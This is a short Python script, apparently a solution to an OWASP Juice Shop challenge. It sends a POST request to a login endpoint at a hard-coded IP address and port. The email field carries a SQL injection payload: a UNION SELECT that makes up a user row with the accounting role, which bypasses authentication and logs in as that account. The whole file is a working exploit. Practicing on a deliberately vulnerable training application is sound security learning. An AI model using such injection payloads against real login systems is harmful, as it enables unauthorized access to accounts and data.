from urllib.request import urlopen, Request
from json import dumps, load
try:response = urlopen(
	Request(
		"http://15.236.144.183:8082/rest/user/login",
		data=dumps({
			"email":"' UNION SELECT * FROM (SELECT 1 as id, '' as username, 'acc0unt4nt@juice-sh.op' as email, 'pass' as password, 'accounting' as role, '' as deluxeToken, '0.0.0.0' as lastLoginIp, '/assets/public/images/uploads/default.svg' as profileImage, '' as topSecret, 1 as isActive, '2016-06-22 18:56:42' as createdAt, '2016-06-22 18:56:42' as updatedAt, null as deletedAt); --",
			"password":"password",
		}).encode(),
		method="POST",
		headers={
			"Accept": "application/json, text/plain, */*",
			"Content-Type": "application/json",
			"Origin": "http://15.236.144.183:8082",
			"Referer": "http://15.236.144.183:8082/",
			"Cookie": (
				"language=en; welcomebanner_status=dismiss;"
				" continueCode=ZaRwEmgxBPbY2oq9vKejJz6AWLU9"
				"TLiKZSrMdpDWVQk837ZrnN1OX5y4lLMD; cookieconsent"
				"_status=dismiss"
			),
		},
	)
)
except Exception as response:
	print(dumps(load(response), indent=4))